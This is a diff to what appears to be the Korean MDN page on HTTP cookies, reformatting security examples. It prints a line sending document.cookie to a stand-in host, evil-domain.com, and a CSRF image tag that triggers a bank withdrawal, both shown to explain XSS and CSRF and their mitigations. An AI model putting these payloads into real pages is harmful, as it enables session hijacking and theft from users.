@@ -125,7 +125,8 @@ console.log(document.cookie);
 쿠키는 대개 웹 애플리케이션에서 사용자와 그들의 인증된 세션을 식별하기 위해 사용되곤 합니다. 그래서 쿠키를 가로채는 것은 인증된 사용자의 세션 하이재킹으로 이어질 수 있습니다. 쿠키를 가로채는 일반적인 방법은 소셜 공학 사용 혹은 애플리케이션 내 {{Glossary("XSS")}} 취약점을 이용하는 것을 포함합니다.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HttpOnly` 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.
@@ -135,7 +136,8 @@ console.log(document.cookie);
 [위키피디아](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)에 {{Glossary("CSRF")}}에 대한 좋은 예제가 있습니다. 위키피디아의 예와 같은 상황에서, 당신의 은행 서버에 돈을 입금하는 실제 요청 대신에, 실제로는 이미지가 아닌 이미지를 포함시키고 있습니다(예를 들어 필터링되지 않은 채팅이나 포럼 페이지 내에):
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 이제, 당신이 당신의 은행 계좌에 로그인하고 당신의 쿠키가 여전히 유효하다면(그리고 별 다른 검증 절차가 존재하지 않는다면), 해당 이미지를 포함하고 있는 HTML을 로드하자마자 돈이 송금될 것입니다. 이런 일들이 벌어지는 것을 방지하기 위한 몇 가지 기술이 있습니다:
